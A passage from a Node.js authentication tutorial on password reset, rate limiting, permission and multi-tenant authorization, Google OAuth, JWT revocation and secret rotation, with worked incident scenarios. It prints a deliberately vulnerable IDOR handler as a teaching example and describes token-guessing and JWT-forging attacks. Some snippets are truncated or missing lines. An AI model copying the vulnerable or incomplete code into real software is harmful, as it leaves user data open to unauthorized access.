    resetPasswordExpires: { $gt: new Date() }
  });

  if (!user) {
    return res.status(400).json({ error: "Invalid or expired reset link" });
  }

  // 3. Hash new password and save
  user.password = await bcrypt.hash(password, 10);
  
  // 4. Clean up reset token (single use!)
  user.resetPasswordToken = null;
  user.resetPasswordExpires = null;
  
  // 5. IMPORTANT: Invalidate all existing sessions/refresh tokens
  //    (prevent attacker from staying logged in if they had access)
  await RefreshToken.deleteMany({ userId: user._id });
  
  await user.save();

  res.json({ message: "Password reset successful. Please log in with your new password." });
}
```

#### The Complete Password Reset Security Model

```
Step 1: User → POST /forgot-password { email }
Step 2: Server → Generate random token → Hash it → Store hash in DB
Step 3: Server → Send PLAIN token in email link
Step 4: User clicks link → POST /reset-password/:plainToken { newPassword }
Step 5: Server → Hash the URL token → Compare with DB hash → Match? 
Step 6: Server → Hash new password → Update user → Delete reset token
Step 7: Server → Invalidate ALL existing sessions/refresh tokens

Security layers:
  ✅ Plain token only exists in the email (transient)
  ✅ DB only has the hash (even if DB leaks, tokens are useless)
  ✅ Token expires in 10 minutes (tiny attack window)
  ✅ Token is single-use (deleted after reset)
  ✅ All sessions invalidated (boot out any attacker)
  ✅ Same response for existing/non-existing emails (no enumeration)
```

### Step 12: Rate Limiting — Layered Defense

We covered basic rate limiting in Phase 1, but production systems need **layered, targeted rate limiting**.

#### 12.1 Multi-Tier Rate Limiting

```javascript
const rateLimit = require('express-rate-limit');

// Tier 1: Global rate limit (all routes)
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,   // 15 minutes
  max: 100,                     // 100 requests per window per IP
  message: { error: "Too many requests" },
  standardHeaders: true,
});

// Tier 2: Auth-specific rate limit (strict)
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,   // 15 minutes
  max: 5,                      // Only 5 attempts
  message: { error: "Too many login attempts. Try again later." },
  skipSuccessfulRequests: true, // Don't count successful logins
});

// Tier 3: Password reset rate limit (very strict)
const resetLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,   // 1 hour
  max: 3,                      // Only 3 reset requests per hour
  message: { error: "Too many password reset requests." },
});

// Tier 4: API rate limit (for authenticated endpoints)
const apiLimiter = rateLimit({
  windowMs: 60 * 1000,         // 1 minute
  max: 30,                     // 30 requests per minute
  message: { error: "Rate limit exceeded" },
});

// Apply
app.use(globalLimiter);                                   // Everything
app.post('/api/auth/login', authLimiter, login);          // Login
app.post('/api/auth/register', authLimiter, register);    // Register
app.post('/api/auth/forgot-password', resetLimiter, forgotPassword); // Reset
app.use('/api/', apiLimiter);                             // All API routes
```

#### Rate Limiting Strategy Table

| Endpoint             | Window    | Max Attempts | Reasoning                                         |
| -------------------- | --------- | ------------ | -------------------------------------------------- |
| **Login**            | 15 min    | 5            | Brute-force protection                              |
| **Register**         | 15 min    | 5            | Prevent spam account creation                       |
| **Forgot Password**  | 1 hour    | 3            | Prevent email bombing                               |
| **Verify Email**     | 15 min    | 10           | Allow retries but prevent abuse                     |
| **API (general)**    | 1 min     | 30           | Fair usage across all users                         |
| **API (heavy)**      | 1 min     | 5            | Expensive operations (file upload, search, export)  |

### Step 13: Permission-Based Authorization

#### Why RBAC Has Limits

With basic RBAC, you define roles like `admin`, `user`, `moderator`. But what happens when:

- An **editor** should be able to edit posts but NOT delete them?
- A **billing admin** should manage invoices but NOT see user data?
- A **support agent** should read customers but NOT modify their passwords?

Roles are **too coarse-grained**. You need **fine-grained permissions**.

#### 13.1 The Permission Model

```javascript
// models/Role.js — Roles now have specific permissions
```

#### 13.3 Permission-Based Middleware

```javascript
// middleware/authorize.js
function requirePermission(...requiredPermissions) {
  return async (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    // Fetch user's role with permissions
    const user = await User.findById(req.user.id).populate('role');

    if (!user || !user.role) {
      return res.status(403).json({ error: "No role assigned" });
    }

    // Check if user's role has ALL required permissions
    const hasAllPermissions = requiredPermissions.every(
      permission => user.role.permissions.includes(permission)
    );

    if (!hasAllPermissions) {
      return res.status(403).json({ 
        error: "Forbidden — insufficient permissions" 
      });
    }

    // Attach permissions to request for downstream use
    req.permissions = user.role.permissions;
    next();
  };
}
```

#### 13.4 Using Permission Middleware

```javascript
// Anyone who can read notes:
app.get('/api/notes', authMiddleware, requirePermission('notes:read'), getNotes);

// Only users who can create notes:
app.post('/api/notes', authMiddleware, requirePermission('notes:create'), createNote);

// Only users who can delete notes:
app.delete('/api/notes/:id', authMiddleware, requirePermission('notes:delete'), deleteNote);
// Editor has notes:create but NOT notes:delete → 403 Forbidden ❌

// Multiple permissions required:
app.get('/api/admin/analytics', 
  authMiddleware, 
  requirePermission('admin:access', 'admin:view-analytics'), 
  getAnalytics
);

// Billing-admin can access billing:
app.get('/api/billing/invoices', 
  authMiddleware, 
  requirePermission('billing:read'), 
  getInvoices
);
// billing-admin role has billing:read ✅ → access granted
// billing-admin role has NO users:read → can't see user data ✅ (data isolation)
```

#### RBAC vs Permission-Based — When to Use Which

| Aspect               | Simple RBAC                          | Permission-Based                        |
| -------------------- | ------------------------------------ | --------------------------------------- |
| **Granularity**      | Coarse (role-level)                  | Fine (action-level)                     |
| **Flexibility**      | Limited — adding new access requires new roles | Flexible — mix and match permissions |
| **Complexity**       | Simple to implement                  | More complex, but more powerful          |
| **Best for**         | Small apps, 2-3 roles               | SaaS platforms, enterprise apps          |
| **Example**          | `role === 'admin'`                   | `permissions.includes('users:delete')`  |
| **Real-world**       | Simple blogs, personal projects      | Slack, Notion, AWS IAM, GitHub          |

### Step 14: Multi-Tenant Authorization

**Multi-tenancy** is the architecture used by every SaaS platform — where a single application serves multiple organizations (tenants), each with isolated data.

#### The Problem

Imagine you're building "NoteApp" — a SaaS note-taking platform:

```
NoteApp Platform
├── Organization: "Acme Corp" (Tenant A)
│   ├── User: alice@acme.com (Admin)
│   ├── User: bob@acme.com (Editor)
│   └── Notes: Acme's confidential documents
│
├── Organization: "Startup Inc" (Tenant B)
│   ├── User: charlie@startup.com (Admin)
│   ├── User: diana@startup.com (Viewer)
│   └── Notes: Startup's pitch decks
```

**Critical requirement:** Alice must NEVER see Startup Inc's notes. Charlie must NEVER see Acme Corp's notes. **Data isolation** is non-negotiable.

#### 14.1 Models with Organization Scoping

```javascript

const orgSchema = new mongoose.Schema({
```

#### 14.2 Tenant Isolation Middleware

```javascript
// middleware/tenantIsolation.js
// This middleware ensures EVERY query is scoped to the user's organization

function tenantIsolation(req, res, next) {
  if (!req.user || !req.user.organizationId) {
    return res.status(403).json({ error: "No organization context" });
  }

  // Attach org scope to request — used by all downstream handlers
  req.orgScope = { organizationId: req.user.organizationId };
  next();
}

// Usage in routes — EVERY data query includes orgScope
app.get('/api/notes', authMiddleware, tenantIsolation, async (req, res) => {
  // Only returns notes from the user's organization
  const notes = await Note.find(req.orgScope).sort({ createdAt: -1 });
  // Alice (Acme) → finds only Acme's notes
  // Charlie (Startup) → finds only Startup's notes
  res.json(notes);
});

app.post('/api/notes', authMiddleware, tenantIsolation, async (req, res) => {
  const note = await Note.create({
    title: req.body.title,
    content: req.body.content,
    authorId: req.user.id,
    organizationId: req.user.organizationId  // Auto-scoped!
  });
  res.status(201).json(note);
});

app.get('/api/notes/:id', authMiddleware, tenantIsolation, async (req, res) => {
  // Even when fetching a single note by ID, ALWAYS include org scope
  const note = await Note.findOne({ 
    _id: req.params.id, 
    ...req.orgScope       // ← This prevents cross-tenant access!
  });
  
  if (!note) {
    return res.status(404).json({ error: "Note not found" });
  }

  res.json(note);
});
```

#### Why `req.orgScope` is Critical

```
WITHOUT org scoping:
  GET /api/notes/507f1f77...  → Returns the note, regardless of who owns it
  Alice (Acme) could access Charlie's (Startup) notes by guessing IDs!

WITH org scoping:
  GET /api/notes/507f1f77...  + orgScope = { organizationId: "acme-id" }
  → Only returns the note IF it belongs to Acme
  → Returns 404 if the note belongs to Startup (Alice can't even tell it exists)
```

```javascript
// middleware/orgAuthorize.js
function orgAuthorize(...allowedRoles) {
  return (req, res, next) => {
    if (!allowedRoles.includes(req.user.orgRole)) {
      return res.status(403).json({ error: "Insufficient organization permissions" });
    }
    next();
  };
}

// Only org admins/owners can manage members

  authMiddleware, 
  tenantIsolation, 
  orgAuthorize('owner', 'admin'),
  inviteMember
);

// Only org owners can delete the organization

  authMiddleware, 
  tenantIsolation, 
  orgAuthorize('owner'),
  deleteOrganization
);

// All members can view org info

  authMiddleware, 
  tenantIsolation, 
  orgAuthorize('owner', 'admin', 'member', 'viewer'),
  getOrgInfo

```

```

  → authMiddleware        (WHO are you? — verify JWT/session)
  → tenantIsolation       (WHICH org? — scope all queries)
  → orgAuthorize('admin') (WHAT role in this org? — check permissions)
  → Route Handler         (Business logic — already scoped & authorized)
```

## 🌐 PHASE 6 — OAuth & Third-Party Login

**Goal:** Understand OAuth conceptually and implement "Login with Google" using Passport.js.

### Key Concepts You Must Understand

#### What is the Authorization Code Flow?

This is the **most secure** OAuth 2.0 flow, used by server-side applications.

```
┌──────┐          ┌──────────┐          ┌────────────┐
│ User │          │ Your App │          │ Google     │
│      │          │ (Server) │          │ Auth Server│
└──┬───┘          └────┬─────┘          └─────┬──────┘
   │                   │                      │
   │ Click "Login      │                      │
   │ with Google"      │                      │
   │──────────────────→│                      │
   │                   │                      │
   │                   │ Redirect to Google   │
   │                   │─────────────────────→│
   │                   │                      │
   │ Google Login Page │                      │
   │←─────────────────────────────────────────│
   │                   │                      │
   │ Enter credentials │                      │
   │ + Grant consent   │                      │
   │─────────────────────────────────────────→│
   │                   │                      │
   │                   │ Auth Code (short-lived, one-time use)
   │                   │←─────────────────────│
   │                   │                      │
   │                   │ Exchange code for    │
   │                   │ Access Token + ID    │
   │                   │ Token (server-to-    │
   │                   │ server, secure)      │
   │                   │─────────────────────→│
   │                   │←── Tokens ───────────│
   │                   │                      │
   │ Logged in!        │                      │
   │←──────────────────│                      │
```

**Why the code exchange?** The Auth Code is exchanged server-to-server (your backend → Google). The user's browser never sees the access token. This prevents token leakage via browser history, referrer headers, or JavaScript.

#### What is PKCE (Proof Key for Code Exchange)?

PKCE (pronounced "pixy") adds an extra layer of security for public clients (mobile apps, SPAs) that can't keep a client secret.

```
1. Client generates a random string: code_verifier = "dBjftJeZ4CVP..."
2. Client hashes it: code_challenge = SHA256(code_verifier)
3. Client sends code_challenge with auth request
4. When exchanging code for token, client sends original code_verifier
5. Server computes SHA256(code_verifier) and checks it matches code_challenge
6. If match → tokens issued (proves same client that started the flow)

Why? Even if an attacker intercepts the auth code, they can't exchange it
without the code_verifier (which never left the client).
```

#### What is an ID Token (OIDC)?

```json
// The ID Token is a JWT that proves WHO the user is
{
  "iss": "https://accounts.google.com",     // Who issued it (Google)
  "sub": "110169484474386276334",            // User's unique ID at Google
  "aud": "your-app-client-id",              // Who it's for (your app)
  "email": "user@gmail.com",                // User's email
  "name": "John Doe",                        // User's name
  "picture": "https://...",                  // Profile photo
  "email_verified": true,                   // Is email verified at Google?
  "iat": 1709020800,                        // Issued at
  "exp": 1709024400                          // Expires at
}
```

The ID Token is NOT for accessing APIs. It's purely for **identifying the user**. The Access Token is what you use to call Google's APIs on behalf of the user.

### Implement Google Login with Passport.js

#### Setup

```javascript
// Install required packages:
// npm install passport passport-google-oauth20

const passport = require('passport');
const GoogleStrategy = require('passport-google-oauth20').Strategy;

// Configure Google Strategy
passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: '/api/auth/google/callback'
  },
  async function(accessToken, refreshToken, profile, done) {
    try {
      // Check if user already exists with this Google ID
      let user = await User.findOne({ googleId: profile.id });

      if (!user) {
        // First time login — create account
        user = await User.create({
          googleId: profile.id,
          email: profile.emails[0].value,
          name: profile.displayName,
          avatar: profile.photos[0]?.value,
          isVerified: true,  // Google already verified their email
          role: 'user'
        });
      }

      return done(null, user);
    } catch (error) {
      return done(error, null);
    }
  }
));
```

#### Routes

```javascript
// Step 1: Redirect to Google
app.get('/api/auth/google', 
  passport.authenticate('google', { 
    scope: ['profile', 'email']  // What we want from Google
  })
);

// Step 2: Google redirects back with auth code
// Passport exchanges code for tokens and calls our strategy callback
app.get('/api/auth/google/callback',
  passport.authenticate('google', { session: false }),
  async (req, res) => {
    // req.user is populated by Passport's strategy callback
    const user = req.user;

    // Create our OWN JWT for the user (don't use Google's tokens for your API)
    const accessToken = jwt.sign(
      { sub: user._id, role: user.role },
      process.env.JWT_SECRET,
      { expiresIn: '15m' }
    );

    // Generate refresh token (same as before)
    const refreshToken = crypto.randomBytes(64).toString('hex');
    await RefreshToken.create({
      token: refreshToken,
      userId: user._id,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
    });

    // Set refresh token cookie
    res.cookie('refreshToken', refreshToken, {
      httpOnly: true, secure: true, sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000, path: '/api/auth'
    });

    // Redirect to frontend with access token
    res.redirect(`${process.env.FRONTEND_URL}/auth/callback?token=${accessToken}`);
  }
);
```

> **Key insight:** After Google authenticates the user, your server creates its **own** JWT and refresh token. You don't use Google's access token for your API. Google's token is only for calling Google's APIs (if needed).

## 🧠 PHASE 7 — Architectural Thinking

**Goal:** Understand auth at the **system design** level — how it works in microservices, distributed systems, and enterprise architectures.

### RS256 vs HS256 — Choosing Your JWT Signing Algorithm

| Aspect          | HS256 (HMAC)                          | RS256 (RSA)                              |
| --------------- | ------------------------------------- | ---------------------------------------- |
| **Type**        | Symmetric (shared secret)             | Asymmetric (public/private key pair)     |
| **How it works** | Same secret signs AND verifies       | Private key signs, public key verifies   |
| **Key sharing** | Every service needs the secret        | Only auth server has private key         |
| **Security**    | If any service is compromised, secret leaks | Only public key is shared — low risk |
| **Best for**    | Monolithic apps, single server        | Microservices, distributed systems       |
| **Performance** | Faster (simpler computation)          | Slightly slower (RSA math)               |

#### RS256 in Microservices

```
                    ┌─────────────────────────┐
                    │     Auth Service         │
                    │  (has PRIVATE key)       │
                    │  Signs JWTs on login     │
                    └────────────┬────────────┘
                                 │
              JWT signed with private key
                                 │
         ┌───────────────────────┼────────────────────────┐
         ↓                       ↓                        ↓
┌─────────────────┐   ┌─────────────────┐   ┌─────────────────┐
│ Orders Service  │   │ Payment Service │   │ Users Service   │
│ (has PUBLIC key)│   │ (has PUBLIC key)│   │ (has PUBLIC key)│
│ Verifies JWT ✅ │   │ Verifies JWT ✅ │   │ Verifies JWT ✅ │
└─────────────────┘   └─────────────────┘   └─────────────────┘

If Payment Service is compromised:
  HS256: Attacker has the shared secret → can forge ANY JWT → disaster
  RS256: Attacker has only the public key → can verify, NOT forge → safe
```

#### When to Use Which

```
Solo server / monolith?     → HS256 (simpler, faster)
Microservices / distributed? → RS256 (more secure, no secret sharing)
Using an auth provider?     → They handle it for you (usually RS256 + JWKS)
```

### Token Revocation Strategies

In production, you WILL need to revoke tokens. Here are the strategies, ranked by complexity:

#### Strategy 1: Short-Lived Access Tokens (Simplest)

```
Access token expires in 15 minutes. 
Refresh token can be revoked from the database.
After access token expires, refresh is denied → user is effectively logged out.

Drawback: User retains access for up to 15 minutes after revocation.
```

#### Strategy 2: Token Blacklist (Redis)

```javascript
// When revoking a token:
await redis.set(
  `blacklist:${tokenId}`,  // Use JTI (JWT ID) claim
  'revoked',
  'EX', 
  remainingTTL              // Auto-delete when token would have expired anyway
);

// In auth middleware, check blacklist:
const isBlacklisted = await redis.get(`blacklist:${decoded.jti}`);
if (isBlacklisted) {
  return res.status(401).json({ error: "Token revoked" });
}
```

**Why Redis?** Because blacklist checks happen on **every request**. Redis lookups are ~1ms. Database lookups are ~10-50ms. At scale, this difference is massive.

#### Strategy 3: Token Version (Database)

```javascript
// User model has a tokenVersion
userSchema = { ..., tokenVersion: { type: Number, default: 0 } };

// JWT includes the version
jwt.sign({ sub: user._id, ver: user.tokenVersion }, secret);

// In middleware, check version
if (decoded.ver !== user.tokenVersion) {
  return res.status(401).json({ error: "Token invalidated" });
}

// To revoke ALL of a user's tokens:
await User.updateOne({ _id: userId }, { $inc: { tokenVersion: 1 } });
// Now ALL existing tokens for this user are invalid (version mismatch)
```

#### Strategy Comparison

| Strategy             | Revocation Speed | Complexity | Storage Cost | Best For                     |
| -------------------- | ---------------- | ---------- | ------------ | ---------------------------- |
| Short-lived tokens   | Up to 15 min     | Low        | None         | Most apps                    |
| Redis blacklist      | Immediate        | Medium     | Low (Redis)  | Apps needing instant revoke |
| Token version        | Next request     | Low        | None (DB)    | Revoking ALL user tokens    |
| Hybrid (all three)   | Immediate        | High       | Low          | Enterprise / banking         |

### Secret Rotation — Why It Matters

```
What if your JWT secret key is leaked?

Without rotation:
  → Attacker can forge JWTs forever
  → Only fix: change the secret → ALL users logged out globally
  → Disaster

With rotation strategy:
  → Maintain TWO keys: current key + previous key
  → Sign new tokens with current key
  → Verify tokens against BOTH keys (accept either)
  → After old tokens expire (max TTL), drop the previous key
  → Leaked old key becomes useless after the rotation window

Implementation:
  const keys = {
    current:  process.env.JWT_SECRET_V2,   // Sign + verify
    previous: process.env.JWT_SECRET_V1    // Verify only (grace period)
  };

  // When signing: always use current
  jwt.sign(payload, keys.current);

  // When verifying: try current first, then previous
  try {
    return jwt.verify(token, keys.current);
  } catch {
    return jwt.verify(token, keys.previous);  // Grace period
  }
```

> **Best practice:** Rotate secrets every 90 days. Use a secrets manager (AWS Secrets Manager, HashiCorp Vault) for automated rotation.

### Problem 1: "Users Are Getting Logged Out Randomly"

**Scenario:** You deployed a Node.js app with session-based authentication. In development, everything works. In production, users report being randomly logged out mid-session — sometimes after clicking a single link.

**Your production setup:**
```
Load Balancer (Nginx)
  ├── Server Instance 1 (Node.js)
  ├── Server Instance 2 (Node.js)
  └── Server Instance 3 (Node.js)
```

**Think about it first:** Why would sessions break in production but work in development?

#### 🧠 Thought Process (How to Think About This)

```
Step 1: What's different between dev and prod?
  → Dev has ONE server. Prod has THREE behind a load balancer.

Step 2: How do sessions work?
  → Server creates session, stores it, sends session ID as cookie.
  → On next request, browser sends cookie, server looks up session.

Step 3: Where is the session stored by default?
  → In the server's memory (RAM). express-session default = MemoryStore.

Step 4: Connect the dots...
  → If session is in Server 1's memory, and the load balancer sends 
     the next request to Server 2... Server 2's memory has NO session!
  → Server 2 thinks the user isn't logged in → returns 401 → "logged out"

Step 5: Why is it "random"?
  → The load balancer uses round-robin or least-connections routing.
  → Sometimes you land on the right server (logged in), sometimes not.
  → From the user's perspective, it looks random.
```

#### 🔍 The Root Cause

In development, you have **one server**. The session is stored in that server's memory (default `express-session` behavior).

In production with **multiple servers**, the load balancer sends Request 1 to Server 1 (which creates the session), but Request 2 goes to Server 2 (which has **no idea** about that session). Server 2 thinks the user is not logged in → logged out.

**This is called the "sticky session problem."**

```
Request 1 → Server 1 → Creates session in memory → User logged in ✅
Request 2 → Server 2 → No session in memory → User appears logged out ❌
Request 3 → Server 1 → Session found → User logged in ✅
Request 4 → Server 3 → No session → Logged out again ❌
```

#### ✅ The Fix

Use a **centralized session store** (Redis) that all server instances share:

```javascript
const RedisStore = require('connect-redis').default;
const redis = require('redis');
const redisClient = redis.createClient({ url: process.env.REDIS_URL });

app.use(session({
  store: new RedisStore({ client: redisClient }), // Shared store!
  secret: process.env.SESSION_SECRET,
  // ... other options
}));
```

Now all servers read/write sessions to the same Redis instance:

```
Request 1 → Server 1 → Creates session in REDIS ✅
Request 2 → Server 2 → Reads session from REDIS → User logged in ✅
Request 3 → Server 3 → Reads session from REDIS → User logged in ✅
```

> **Key Takeaway:** Never use in-memory session storage in production with multiple servers. Always use Redis or a database-backed session store. The moment you add a second server, in-memory sessions break.

### Problem 2: "Someone Is Accessing Other Users' Accounts"

**Scenario:** Your SaaS platform has a `/api/users/:userId/profile` endpoint. A security audit reveals that User A can access User B's profile data by simply changing the `userId` in the URL.

```
User A (userId: 100) sends:
  GET /api/users/200/profile
  Authorization: Bearer <User A's valid JWT>

Response: User B's private profile data! 😱
```

**Think about it first:** What security principle is being violated?

#### 🧠 Thought Process (How to Think About This)

```
Step 1: Is the user authenticated?
  → YES. The JWT is valid. authMiddleware passes.

Step 2: Is the user authorized to see THIS data?
  → That's the question. User A is asking for User 200's profile.
  → The server never checks if User A IS User 200 or has admin rights.

Step 3: What does the route handler do?
  → It takes req.params.userId (from the URL) and queries the DB directly.
  → It trusts the URL parameter — which the USER controls!

Step 4: What's the rule?
  → Authentication ≠ Authorization
  → "You are who you say you are" ≠ "You can access what you're requesting"
  → The server verified identity but never checked ownership.

Step 5: What's the security term for this?
  → IDOR = Insecure Direct Object Reference
  → OWASP Top 10 vulnerability
  → Very common in APIs that expose entity IDs in URLs
```

#### 🔍 The Root Cause — IDOR Vulnerability

This is an **Insecure Direct Object Reference (IDOR)** vulnerability — one of the OWASP Top 10 security risks.

Your auth middleware verifies that the JWT is valid (authentication ✅), but your route handler doesn't check if User A has permission to access User 200's data (authorization ❌).

**The Vulnerable Code:**

```javascript
app.get('/api/users/:userId/profile', authMiddleware, async (req, res) => {
  // ❌ Uses the URL param directly — any authenticated user can access anyone's data
  const user = await User.findById(req.params.userId);
  res.json(user);
});
```

#### ✅ The Fix

```javascript
app.get('/api/users/:userId/profile', authMiddleware, async (req, res) => {
  // ✅ Verify the authenticated user is requesting their OWN data
  if (req.user.id !== req.params.userId && req.user.role !== 'admin') {
    return res.status(403).json({ error: "Forbidden" });
  }

  const user = await User.findById(req.params.userId);
  res.json(user);
});

// OR better — don't expose userId in URL at all:
app.get('/api/profile', authMiddleware, async (req, res) => {
  // ✅ Always use the authenticated user's ID from the token
  const user = await User.findById(req.user.id);
  res.json(user);
});
```

> **Key Takeaway:** Authentication (who are you?) is NOT the same as authorization (are you allowed to access THIS resource?). Always verify that the authenticated user has permission to access the specific resource they're requesting. The best pattern is to never trust URL params for ownership — use `req.user.id` from the token.

### Problem 3: "Password Reset Links Are Being Exploited"

**Scenario:** Your app sends password reset emails. An attacker discovers that:
1. They can request reset emails for any email address
2. The reset token is a simple incrementing number (e.g., `reset/1234`, `reset/1235`)
3. The token doesn't expire

The attacker writes a script to hit `/reset/1`, `/reset/2`, `/reset/3`... and takes over multiple accounts.

**Think about it first:** How many security failures are in this system?

#### 🧠 Thought Process (How to Think About This)

```
Step 1: Can the attacker predict the next token?
  → YES! Tokens are sequential numbers: 1234, 1235, 1236...
  → Attacker just increments and tries each one.
  → Lesson: Tokens must be RANDOM and UNGUESSABLE.

Step 2: Can the attacker try forever?
  → YES! Tokens never expire.
  → A reset link from 6 months ago still works.
  → Lesson: Tokens must EXPIRE (10 min for password reset).

Step 3: Can the attacker brute-force the endpoint?
  → YES! No rate limiting on the reset endpoint.
  → They can try millions of URLs per second.
  → Lesson: Rate limit sensitive endpoints.

Step 4: If the database is breached, are tokens exposed?
  → YES! Tokens are stored in plain text.
  → DB leak = all valid tokens exposed = mass account takeover.
  → Lesson: Hash tokens before storing (same as passwords).

Step 5: Can a token be used multiple times?
  → YES! Nothing deletes it after use.
  → Lesson: Tokens must be single-use (delete after reset).

Count: 5 simultaneous failures in one feature!
```

#### 🔍 The Root Cause — 5 Failures!

**Failure 1: Predictable tokens**
Using incrementing numbers instead of cryptographically random tokens.
```
❌ Token: 1234 (predictable, guessable)
✅ Token: "a8f3b2c1e4d5f6a7b8c9d0e1f2a3b4c5" (128-bit random, unguessable)
```

**Failure 2: Tokens don't expire**
Without expiry, a reset link from 6 months ago is still valid.
```
✅ Fix: verificationExpires: new Date(Date.now() + 10 * 60 * 1000) // 10 minutes
```

**Failure 3: Tokens stored in plain text**
If the database is breached, attacker gets all valid reset tokens.
```
✅ Fix: Hash tokens with SHA-256 before storing in DB
```

**Failure 4: No rate limiting**
Attacker can request millions of reset endpoints per second.
```
✅ Fix: Rate limit password reset endpoint (3 requests/hour)
```

**Failure 5: Tokens are not single-use**
A reset token can be used multiple times to reset the password.
```
✅ Fix: Delete the token from DB immediately after successful reset
```

> **Key Takeaway:** Security is a chain — it's only as strong as its weakest link. A password reset system needs: random tokens + hashing + expiry + single-use + rate limiting. Missing even ONE creates a vulnerability.

### Problem 4: "Our JWT Secret Got Leaked on GitHub"

**Scenario:** A developer accidentally committed the `.env` file containing `JWT_SECRET=supersecretkey123` to a public GitHub repo. The commit was public for 2 hours before being removed.

**Think about it first:** What's the blast radius, and what should you do?

#### 🧠 Thought Process (How to Think About This)

```
Step 1: What can someone do with the JWT secret?
  → The secret is used to SIGN JWTs.
  → Anyone with the secret can CREATE valid JWTs.
  → They can craft: { sub: "any-user-id", role: "admin" }
  → This gives them admin access to EVERYTHING.

Step 2: Does removing the commit help?
  → NO. Git history is public. Bots scrape GitHub 24/7.
  → By the time you remove it, it's already harvested.
  → Think of it as: once public, always compromised.

Step 3: What's the immediate action?
  → Change the secret IMMEDIATELY. This invalidates ALL existing JWTs.
  → Yes, all users get logged out. That's acceptable vs. a breach.

Step 4: What about refresh tokens?
  → They're in the database (random strings, not JWTs).
  → The leaked secret doesn't let attackers forge refresh tokens.
  → But still: delete them all to be safe (force re-login).

Step 5: How do we prevent this?
  → .gitignore must include .env from day 1
  → Use pre-commit hooks to block secrets
  → Use a secrets manager (Vault, AWS Secrets Manager)
  → Never use weak secrets like "supersecretkey123"

Step 6: How do we handle rotation better next time?
  → Maintain TWO keys: current + previous
  → Sign with current, verify against both
  → Grace period until old tokens expire
  → Then remove old key
```

#### 🔍 The Incident Response

**Blast Radius:**
- Any attacker who saw the commit can now **forge ANY JWT** with any user ID and role
- They can create `{ sub: "admin-user-id", role: "admin" }` and have full admin access
- Removing the commit doesn't help — git history is cached, and bots scrape GitHub continuously

**Incident Response Plan:**

```
IMMEDIATE (Within minutes):
  1. Rotate the JWT secret → All existing tokens become invalid
  2. All users are forcefully logged out (minor inconvenience vs security breach)
  3. Invalidate all refresh tokens in the database

SHORT-TERM (Within hours):
  4. Audit logs — check for suspicious API calls during the exposure window
  5. Force password reset for any accounts with suspicious activity
  6. Check if other secrets were in the same .env file (DB password, API keys, etc.)

LONG-TERM (Prevention):
  7. Add .env to .gitignore (should have been there from day 1)
  8. Use a secrets manager (AWS Secrets Manager, HashiCorp Vault)
  9. Set up GitHub secret scanning alerts
  10. Implement secret rotation strategy (dual-key system)
  11. Never use weak secrets like "supersecretkey123"
```

#### ✅ The Dual-Key Rotation Fix

```javascript
// Instead of one secret, maintain two:
const CURRENT_SECRET = process.env.JWT_SECRET_V2;  // New key
const PREVIOUS_SECRET = process.env.JWT_SECRET_V1; // Old key (grace period)

// Sign with current:
jwt.sign(payload, CURRENT_SECRET);

// Verify with both (try current first):
function verifyToken(token) {
  try { return jwt.verify(token, CURRENT_SECRET); }
  catch { return jwt.verify(token, PREVIOUS_SECRET); }
}

// After all old tokens expire (max 15 min for access tokens), 
// remove PREVIOUS_SECRET entirely.
```

> **Key Takeaway:** Secrets in code/git is a ticking bomb. Use environment variables, secrets managers, and pre-commit hooks that block `.env` file commits. Have a rotation strategy BEFORE you need it.

### Problem 5: "We Need to Add Google Login to Our Existing App"

**Scenario:** Your app has email/password authentication with 50,000 existing users. The product team wants to add "Sign in with Google." Some existing users will have Google accounts matching their registered email.

**Think about it first:** How do you handle the case where an existing user logs in with Google for the first time, and their Google email matches their existing account?

#### 🧠 Thought Process (How to Think About This)

```
Step 1: What are the possible states when Google login happens?
  → State A: User has logged in with Google before (googleId exists)
  → State B: User has an email/password account with same email (no googleId)
  → State C: Completely new user (no account at all)

Step 2: What's the WRONG thing to do for State B?
  → Create a NEW account with the same email → DUPLICATE!
  → Now john@gmail.com has TWO accounts (one email-based, one Google-based)
  → Their data is split. They're confused. Your database is inconsistent.

Step 3: What's the RIGHT thing to do for State B?
  → LINK the Google identity to the existing account.
  → Add googleId to the existing user document.
  → Now they can log in with EITHER method, same account.

Step 4: What about the User model?
  → password field must be OPTIONAL (Google-only users don't have one)
  → googleId field must be OPTIONAL (email-only users don't have one)
  → Track authMethods: ['local', 'google'] for each user.

Step 5: What about email verification?
  → Google already verified the email. Set isVerified: true.
  → This is actually a benefit — no verification email needed.

Step 6: Edge case: What if Google email doesn't match?
  → User has account with work@company.com
  → Logs in with Google using personal@gmail.com
  → These are DIFFERENT emails → create new account (not a link)
  → Linking only happens when emails match.
```

#### 🔍 The Account Linking Strategy

**The Core Problem:** If `john@gmail.com` already has an account (via email/password), and then logs in with Google (which also reports `john@gmail.com`), you need to **link** the Google identity to the existing account — NOT create a duplicate.

**The Strategy:**

```javascript
async function handleGoogleCallback(googleProfile) {
  const googleEmail = googleProfile.emails[0].value;

  // 1. Check if user already logged in with Google before
  let user = await User.findOne({ googleId: googleProfile.id });
  if (user) {
    return user; // Returning user → they've linked before
  }

  // 2. Check if email already exists (from email/password registration)
  user = await User.findOne({ email: googleEmail });
  if (user) {
    // LINK Google account to existing user
    user.googleId = googleProfile.id;
    user.avatar = user.avatar || googleProfile.photos[0]?.value;
    // Don't overwrite their name — they chose it during registration
    await user.save();
    return user; // Same account, now with Google linked
  }

  // 3. Brand new user — create account
  user = await User.create({
    email: googleEmail,
    name: googleProfile.displayName,
    googleId: googleProfile.id,
    avatar: googleProfile.photos[0]?.value,
    isVerified: true,  // Google verified it
    role: 'user'
    // No password field — this user can only login via Google
  });

  return user;
}
```

**Updated User Model:**

```javascript
const userSchema = new mongoose.Schema({
  email:      { type: String, required: true, unique: true },
  password:   { type: String },          // Optional — Google users won't have one
  name:       { type: String, required: true },
  googleId:   { type: String, unique: true, sparse: true },  // Optional — email users won't have one
  avatar:     { type: String },
  isVerified: { type: Boolean, default: false },
  role:       { type: String, default: 'user' },
  authMethods: [{ type: String, enum: ['local', 'google'] }]  // Track how user authenticates
});
```

